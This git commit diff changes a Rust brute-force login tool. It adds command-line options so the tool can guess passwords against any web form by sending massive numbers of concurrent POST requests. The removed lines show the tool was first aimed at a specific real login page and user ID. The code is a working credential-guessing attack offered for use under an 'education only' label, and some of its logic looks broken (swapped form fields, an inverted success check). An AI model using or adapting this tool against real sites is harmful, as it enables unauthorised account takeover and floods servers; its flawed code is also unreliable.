b5b46186d2822cb86296f717bed183e341128292
UnforgivenLalalend <acc4anim@gmail.com>
2021-08-09 23:06:03 +0200

    added clapp

---
+++ README.md
@@ -0,0 +1,5 @@
+To start programm:
+```
+$ cargo build --release
+$ ./target/release/rust-bfa -u "https://bla-bla-bla.com" -l "root" --username-field "username" --password-field "password" --err "Auth Error"
+```
--- src/main.rs
+++ src/main.rs
@@ -3,8 +3,10 @@ use chrono::prelude::*;
 use itertools::Itertools;
 use tokio::task::JoinHandle;
 
-fn password_generator<'a>() -> impl Iterator<Item = String> + 'a {
-    let charset: &'a str = "abcdefghijklmnopqrstuvwxyz0123456789";
+use clap::{App, Arg, SubCommand};
+
+fn password_generator() -> impl Iterator<Item = String> {
+    let charset: &str = "abcdefghijklmnopqrstuvwxyz0123456789";
 
     (1..=20)
         .flat_map(move |len| {
@@ -18,7 +20,13 @@ fn password_generator<'a>() -> impl Iterator<Item = String> + 'a {
         .map(|chars| chars.into_iter().collect())
 }
 
-async fn sending_requests() {
+async fn sending_requests<'a>(
+    url: &'static str,
+    username: &'static str,
+    username_field: &'static str,
+    password_field: &'static str,
+    error_message: &'static str,
+) {
     let mut request_amount = 0;
     let mut tasks: Vec<JoinHandle<Result<(), ()>>> = Vec::new();
 
@@ -26,23 +34,23 @@ async fn sending_requests() {
         request_amount += 1;
 
         tasks.push(tokio::spawn(async move {
-            let fields = [("username", "10205"), ("password", &password)];
+            let fields = [(username, username_field), (password_field, &password)];
 
             loop {
-                match reqwest::Client::new()
-                    .post("https://ag45.dots.org.ua/login")
-                    .form(&fields)
-                    .send()
-                    .await
-                {
+                match reqwest::Client::new().post(url).form(&fields).send().await {
                     Ok(resp) => match resp.text().await {
                         Ok(text) => {
-                            if text.contains("ТУРНИРЫ") {
+                            if text.contains(error_message) {
                                 println!(
-                                    "[{}] Correct Password: '{}'; Request Amount: {}",
+                                    "[{}] Correct Password: '{}'",
                                     Utc::now().format("%Y-%m-%d %H:%M:%S").to_string(),
                                     &password,
-                                    request_amount
+                                );
+
+                                println!(
+                                    "[{}] Request Amount: {}",
+                                    Utc::now().format("%Y-%m-%d %H:%M:%S").to_string(),
+                                    request_amount,
                                 );
                                 std::process::exit(1);
                             }
@@ -57,12 +65,13 @@ async fn sending_requests() {
             Ok(())
         }));
 
-        if tasks.len() % 10000 == 0 {
-            tokio::time::sleep(std::time::Duration::from_secs(5)).await;
+        if tasks.len() % 1000 == 0 {
+            let tasks_length = tasks.len();
+
             println!(
-                "[{}] Starting {} tasks",
+                "[{}] Executing {} tasks",
                 Utc::now().format("%Y-%m-%d %H:%M:%S").to_string(),
-                tasks.len()
+                &tasks_length
             );
             futures::future::join_all(tasks).await;
 
@@ -73,5 +82,71 @@ async fn sending_requests() {
 
 #[tokio::main]
 async fn main() {
-    sending_requests().await
+    let matches = App::new("Brute Force Attack")
+        .author("Frolov Ivan <frolvanya@gmail.com>")
+        .about("FOR EDUCATION PURPOSES ONLY")
+        .arg(
+            Arg::with_name("url")
+                .short("u")
+                .long("url")
+                .value_name("URL")
+                .help("Sets a website url")
+                .takes_value(true),
+        )
+        .arg(
+            Arg::with_name("username")
+                .short("l")
+                .long("login")
+                .value_name("USERNAME")
+                .help("Sets an username")
+                .takes_value(true),
+        )
+        .arg(
+            Arg::with_name("username_field")
+                .long("username-field")
+                .value_name("USERNAME_FIELD")
+                .help("Sets an username field")
+                .takes_value(true),
+        )
+        .arg(
+            Arg::with_name("password_field")
+                .long("password-field")
+                .value_name("PASSWORD_FIELD")
+                .help("Sets a password field")
+                .takes_value(true),
+        )
+        .arg(
+            Arg::with_name("error_message")
+                .short("e")
+                .long("err")
+                .value_name("ERROR_MESSAGE")
+                .help("Sets an authentication error message")
+                .takes_value(true),
+        )
+        .get_matches();
+
+    let website_url = matches.value_of("url").unwrap();
+    let username = matches.value_of("username").unwrap();
+    let username_field = matches.value_of("username_field").unwrap();
+    let password_field = matches.value_of("password_field").unwrap();
+    let error_message = matches.value_of("error_message").unwrap();
+
+    println!(
+        "[{}] Starting Brute Force Attack",
+        Utc::now().format("%Y-%m-%d %H:%M:%S").to_string(),
+    );
+
+    // println!(
+    //     "{} {} {} {} {}",
+    //     website_url, username, username_field, password_field, error_message
+    // );
+
+    sending_requests(
+        website_url,
+        username,
+        username_field,
+        password_field,
+        error_message,
+    )
+    .await
 }
